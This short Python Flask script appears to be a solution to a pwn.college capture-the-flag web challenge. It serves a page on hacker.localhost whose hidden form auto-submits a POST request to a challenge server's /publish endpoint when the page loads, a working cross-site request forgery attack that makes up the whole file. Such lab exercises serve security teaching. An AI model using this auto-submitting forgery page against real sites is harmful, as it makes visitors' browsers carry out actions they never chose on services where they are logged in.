#!/opt/pwn.college/python

import flask
import os
import requests

app = flask.Flask(__name__)


@app.route("/", methods=["GET"])
def challenge():	
	return "<form action='http://challenge.localhost/publish' method='POST'><input id='h' type='submit' value='Send Request'/></form><script>window.onload = function() {var h = document.getElementById('h');h.click();};</script>"

app.run("hacker.localhost", 1337)
